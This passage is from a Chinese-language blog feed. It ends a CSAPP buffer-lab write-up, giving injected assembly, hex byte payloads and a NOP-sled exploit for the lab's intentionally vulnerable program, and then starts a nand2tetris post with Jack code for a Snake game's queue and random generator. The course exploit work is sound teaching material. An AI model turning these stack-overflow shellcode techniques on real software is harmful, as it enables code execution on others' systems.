class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">		<span class="built_in">validate</span>(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
如果按照正常逻辑，<code>getbuf</code>的返回值为<code>1</code>,而本题要求<code>val == cookie</code>，这就要求返回值为<code>cookie</code>，我们通过修改<code>getbuf</code>的返回值为<code>cookie</code>即可。我们仔细阅读汇编代码如下：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">8048</span>db9:       e8 <span class="number">36</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">80491f</span>4 &lt;getbuf&gt;</span><br><span class="line"><span class="number">8048</span>dbe:       <span class="number">89</span> c3                   mov    %eax,%ebx</span><br><span class="line"><span class="number">8048</span>dc0:       e8 cb ff ff ff          call   <span class="number">8048</span>d90 &lt;uniqueval&gt;</span><br></pre></td></tr></table></figure>
函数的返回值实际存放在<code>%eax</code>寄存器中，我们只需要修改<code>%eax</code>寄存器的值为<code>cookie</code>即可。本题还有比较关键的一点，我们在进行写缓冲区时把<code>test</code>函数的<code>%ebp</code>寄存器破坏掉了，我们返回前还需要恢复<code>%ebp</code>寄存器即可，我们通过<code>gdb</code>调试可以知道<code>%ebp</code>寄存器的地址为<code>0X55683010</code>。恢复的地址和修改寄存器的代码如下：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov $0x6830c384, %eax&quot;</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">&quot;mov $0X55683010, %ebp&quot;</span>); <span class="comment">// resume ebp register</span></span><br><span class="line">    __asm__(<span class="string">&quot;push $0x08048dbe&quot;</span>); <span class="comment">// set return address</span></span><br><span class="line">    __asm__(<span class="string">&quot;ret&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们通过上述编译后，将代码写入到栈上即可，并同时将<code>getbuf</code>函数的返回地址设置为上述指令的起始地址即可。最终的<code>buffer</code>为：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> <span class="number">68</span> de <span class="number">8</span>d <span class="number">04</span> <span class="number">08</span> c3 <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> <span class="number">31</span> b8 <span class="number">2f</span> <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="5-Level-4-Nitroglycerin"><a href="#5-Level-4-Nitroglycerin" class="headerlink" title="5. Level 4: Nitroglycerin"></a>5. Level 4: Nitroglycerin</h3><ul>
<li>本题与第<code>4</code>题相似，但是比较复杂的处理在于栈的地址为动态变换的，此时我们就不可能像之前处理那样，栈的返回地址直接写为固定，此时我们需要用到<code>nop sleds</code>。这个所谓的难点也并不复杂，表示我们可以将机器指令全部设置为<code>nop</code>,在<code>nop</code>之后紧挨着执行我们的修改指令，因此我们只需要保证跳转指令一定能够跳转到<code>nop</code>指令段中即可，题目中所谓的随机栈地址的范围变化为<code>[-240,240]</code>之间进行变动，我们只需要设定某个值保证跳转一定能够跳转到<code>nop</code>指令即可。</li>
<li>此处我们将<code>512</code>个字节的内容全部设置为<code>nop</code>,只要保证指令一定能够跳转<code>nop</code>区间即可，因为<code>nop</code>执行结束后紧挨着即为我们需要执行的指令。</li>
<li>我们同时还需要恢复<code>ebp</code>寄存器，我们仔细观察<code>ebp</code>寄存器实际为<code>esp</code>地址偏移<code>0x28</code>即可。因为地址从高往低增长，所以<code>$ebp = $esp + 28</code>，我们可以通过汇编代码得知。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">08048e26</span> &lt;testn&gt;:</span><br><span class="line"> <span class="number">8048e26</span>:       <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">8048e27</span>:       <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048e29</span>:       <span class="number">53</span>                      push   %ebx</span><br><span class="line"> <span class="number">8048e2</span>a:       <span class="number">83</span> ec <span class="number">24</span>                sub    $<span class="number">0x24</span>,%esp</span><br><span class="line"> <span class="number">8048e2</span>d:       e8 <span class="number">5</span>e ff ff ff          call   <span class="number">8048</span>d90 &lt;uniqueval&gt;</span><br><span class="line"> <span class="number">8048e32</span>:       <span class="number">89</span> <span class="number">45</span> f4                mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">8048e35</span>:       e8 d2 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">804920</span>c &lt;getbufn&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %esp,%eax&quot;</span>); <span class="comment">// resume ebp register</span></span><br><span class="line">    __asm__(<span class="string">&quot;add $0x28,%eax&quot;</span>);</span><br><span class="line">    __asm__(<span class="string">&quot;mov %eax,%ebp&quot;</span>);</span><br><span class="line">    __asm__(<span class="string">&quot;mov $0x6830c384, %eax&quot;</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">&quot;push $0x8048e3a&quot;</span>); <span class="comment">// set return address</span></span><br><span class="line">    __asm__(<span class="string">&quot;ret&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们通过上述编译后，将代码写入到栈上即可，并同时将<code>getbuf</code>函数的返回地址设置为<code>0x55682eb8</code>。最终的<code>buffer</code>为：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">89</span> e0 <span class="number">83</span> c0</span><br><span class="line"><span class="number">28</span> <span class="number">89</span> c5 b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> <span class="number">68</span> <span class="number">3</span>a</span><br><span class="line"><span class="number">8</span>e <span class="number">04</span> <span class="number">08</span> c3 b8 <span class="number">2</span>e <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，<code>lab3</code>的代码比<code>lab2</code>有趣多了，非常考验逻辑思维能力，通过学习对机器指令的执行过程有了非常熟悉的了解，也对缓冲区攻击的基本原理有了深刻的理解，当然实际的攻击过程远远比这复杂的多。计算机技术需要学习的技巧太多了。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【build a computer】 project 9</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/82/</url>
    <content><![CDATA[<h1 id="week9"><a href="#week9" class="headerlink" title="week9"></a>week9</h1><p>目前已经开始了<code>build a computer</code>系列的最后几章了，后面的章节感觉越来越难，<code>build a computer</code>的<code>part II</code>部分基本上全是软件，需要编码，耗费大量的实践和精力来应付这些代码，不过能够最终通过测试的话还是成就满满，特别是只剩下后面三章了，主要是完成一个<code>jack</code>语言编译器和一个最基本的微型操作系统，并提供基本的系统库函数。感觉难度和挑战还是挺高的，非常喜欢这类基础的课程，要是这些课程放在大学本科该多好，有这么好的教程和资源，却一直从来没有机会接触到这么好的教育资源。其实从内心来说，叶不想让自己的孩子再重复一遍国内这种糟糕的教育，希望孩子能够正常成长吧，等他长大以后，作为老父亲的我能够把自己亲身体会到一些先进的理念和知识体系传授给他。</p>
<h2 id="project"><a href="#project" class="headerlink" title="project"></a>project</h2><p>本周的<code>project</code>是完全任意发挥，就是利用<code>jack</code>语言自己实现一个小游戏之类的，我用<code>jack</code>语言实现了一个贪吃蛇的小游戏，感觉还是非常有意思的。在<code>jack</code>语言中，重新设计了缓存和随机数生成器，题目本身不难，但是如果想设计出来有意思的还是不太容易。大概编码加调试花了两个半天的时间，现在时常感觉有非常多有意思的课程和知识可以学习，但是因为家庭的原因，根本没有时间能够话费在自己的爱好和兴趣上。今天读书的时候，书中写到了一句话，叫做四个责任，“对自己负责，对家庭负责，对工作负责，对社会负责”，这是依次递进的关系，从小到大的原则。<br>最终完成的<code>project</code>代码如下：<br><a href="https://github.com/mike-box/coursera/tree/master/Build%20a%20computer/nand2tetris/nand2tetris/projects/09/Snake">代码</a><br>游戏运行截图如下：<br><img src="https://i.loli.net/2020/11/12/P14z5yEvliAxkBg.png" alt="1"><br>本身<code>project</code>难度不大，但是如何发挥出聪明才智，看到好多老外真心有创意，利用<code>jack</code>语言做了许多非常有意思的游戏，记得映像比较深刻的，有人做了个射击游戏，还有人做了个汉诺塔的游戏。<br>在此项目完成过程，主要就是重新设计了循环队列之类的。</p>
<ul>
<li>循环队列实现<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GluttonousSnake */</span></span><br><span class="line"><span class="comment">/* created by mike meng @ 2020.10.3</span></span><br><span class="line"><span class="comment">*  email: mml1106@126.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span> &#123;</span><br><span class="line">    field Array buffer;</span><br><span class="line">    field <span class="type">int</span> capbility;</span><br><span class="line">    field <span class="type">int</span> rear;</span><br><span class="line">    field <span class="type">int</span> front;</span><br><span class="line">    field <span class="type">int</span> length;</span><br><span class="line"></span><br><span class="line">    constructor Queue <span class="title function_">new</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">        <span class="type">let</span> <span class="variable">capbility</span> <span class="operator">=</span> size;</span><br><span class="line">        <span class="type">let</span> <span class="variable">front</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">let</span> <span class="variable">rear</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">let</span> <span class="variable">buffer</span> <span class="operator">=</span> Memory.alloc(size);</span><br><span class="line">        <span class="type">let</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="keyword">void</span> <span class="title function_">dispose</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">do</span> buffer.dispose(); </span><br><span class="line">        <span class="keyword">do</span> Memory.deAlloc(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (rear = front);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="type">boolean</span> <span class="title function_">isFull</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="type">int</span> check;</span><br><span class="line">        <span class="type">let</span> <span class="variable">check</span> <span class="operator">=</span> Snake.mod(rear + <span class="number">1</span>,capbility);</span><br><span class="line">        <span class="keyword">return</span> (check = front);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="type">boolean</span> <span class="title function_">push_back</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="comment">/*check the Queue is Full*/</span></span><br><span class="line">        <span class="keyword">if</span>(isFull())&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">        <span class="type">let</span> <span class="variable">length</span> <span class="operator">=</span> length + <span class="number">1</span>;</span><br><span class="line">        let buffer[rear] = val;</span><br><span class="line">        <span class="type">let</span> <span class="variable">rear</span> <span class="operator">=</span> Snake.mod(rear + <span class="number">1</span>,capbility);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="type">boolean</span> <span class="title function_">push_front</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="comment">/*check the Queue is Full*/</span></span><br><span class="line">        <span class="keyword">if</span>(isFull())&#123; <span class="keyword">return</span> <span class="literal">false</span>;&#125;</span><br><span class="line">        <span class="type">let</span> <span class="variable">length</span> <span class="operator">=</span> length + <span class="number">1</span>;</span><br><span class="line">        <span class="type">let</span> <span class="variable">front</span> <span class="operator">=</span> Snake.mod(front - <span class="number">1</span> + capbility,capbility);</span><br><span class="line">        let buffer[front] = val;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="type">int</span> <span class="title function_">pop_front</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="type">int</span> res;</span><br><span class="line">        <span class="keyword">if</span>(isEmpty())&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="type">let</span> <span class="variable">res</span> <span class="operator">=</span> buffer[front];</span><br><span class="line">        <span class="type">let</span> <span class="variable">front</span> <span class="operator">=</span> Snake.mod(front + <span class="number">1</span>,capbility);</span><br><span class="line">        <span class="type">let</span> <span class="variable">length</span> <span class="operator">=</span> length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="type">int</span> <span class="title function_">pop_back</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="type">int</span> res;</span><br><span class="line">        <span class="comment">/*check the Queue is Full*/</span></span><br><span class="line">        <span class="keyword">if</span>(isEmpty())&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="type">let</span> <span class="variable">length</span> <span class="operator">=</span> length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">let</span> <span class="variable">rear</span> <span class="operator">=</span> Snake.mod(rear - <span class="number">1</span> + capbility,capbility);</span><br><span class="line">        <span class="keyword">return</span> buffer[rear];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    method <span class="keyword">void</span> <span class="title function_">print</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="type">int</span> curr;</span><br><span class="line">        <span class="keyword">var</span> <span class="type">int</span> data;</span><br><span class="line">        <span class="comment">/*debug all elements of the queue*/</span></span><br><span class="line">        <span class="type">let</span> <span class="variable">curr</span> <span class="operator">=</span> length;</span><br><span class="line">        <span class="keyword">while</span>(~(curr = <span class="number">0</span>))&#123;</span><br><span class="line">            <span class="type">let</span> <span class="variable">data</span> <span class="operator">=</span> pop_front();</span><br><span class="line">            <span class="keyword">do</span> Output.printInt(data);</span><br><span class="line">            <span class="keyword">do</span> Output.printChar(<span class="number">32</span>); <span class="comment">// prints a space</span></span><br><span class="line">            <span class="keyword">do</span> <span class="title function_">push_back</span><span class="params">(data)</span>;</span><br><span class="line">            <span class="type">let</span> <span class="variable">curr</span> <span class="operator">=</span> curr - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>随机数生成器： 这个可以在维基百科上找到线性方法生成简单的随机数的原理<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Random Number Generator</span></span><br><span class="line"><span class="comment">Original author: Taylor Wacker</span></span><br><span class="line"><span class="comment">Modified by: Connor McKay</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This is a pseudo random number generator that uses the</span></span><br><span class="line"><span class="comment">Linear Congruential Generator (LCG) to generate random</span></span><br><span class="line"><span class="comment">numbers.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Random</span> &#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="type">int</span> x;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Sets a new seed value.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	function <span class="keyword">void</span> <span class="title function_">seed</span><span class="params">(<span class="type">int</span> seed)</span> &#123;</span><br><span class="line">		<span class="type">let</span> <span class="variable">x</span> <span class="operator">=</span> seed;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Returns a mod b. b must be positive.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	function <span class="type">int</span> <span class="title function_">mod</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (a &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="type">let</span> <span class="variable">a</span> <span class="operator">=</span> 